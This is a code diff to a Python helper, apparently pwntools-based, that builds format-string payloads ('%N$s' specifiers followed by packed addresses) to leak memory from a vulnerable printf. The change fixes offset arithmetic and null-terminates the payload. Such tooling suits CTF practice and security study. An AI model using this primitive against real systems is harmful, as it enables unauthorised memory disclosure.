@@ -19,13 +19,13 @@ def deref_payload(buffer_offset: int, addr: List[int]) -> bytes:
     # You could fit this into one line, but readability
     len_addr = len(addr)
     extra_len = len('%$s||')+len(str(buffer_offset+len_addr))+1  #length of one %{}$s, maximally
-    extra_offset = (len_addr*extra_len + len('^^$$')) // (context.bytes)
+    extra_offset = (len_addr*extra_len + len('^^$$\0')) // (context.bytes) +1
     off = buffer_offset + extra_offset  # buf_off + (length of ^^ + all %{}$s, divided by word size)
 	
     # payload
     payload = '||'.join("%{}$s".format(i) for i in range(off, off+len(addr)))
-    payload = '^^' + payload + '$$'
-    payload = payload.ljust(extra_offset*context.bits//8,'\x19').encode()
+    payload = '^^' + payload + '$$\0'   # to make printf() cut off the addrs
+    payload = payload.ljust(extra_offset*context.bytes,'\x19').encode()
     payload += b''.join(map(pack, addr))
     return payload
 
@@ -54,4 +54,4 @@ def dereference(sendprintf: Callable[[bytes],bytes], buffer_offset: int, addr: L
         `addr`: the addresses to leak with %s.
 
     Returns: a list of the bytestrings extracted by %s.'''
-    return deref_extractor(sendprintf(deref_payload(buffer_offset, addr)+'\n'))
+    return deref_extractor(sendprintf(deref_payload(buffer_offset, addr)+b'\n'))
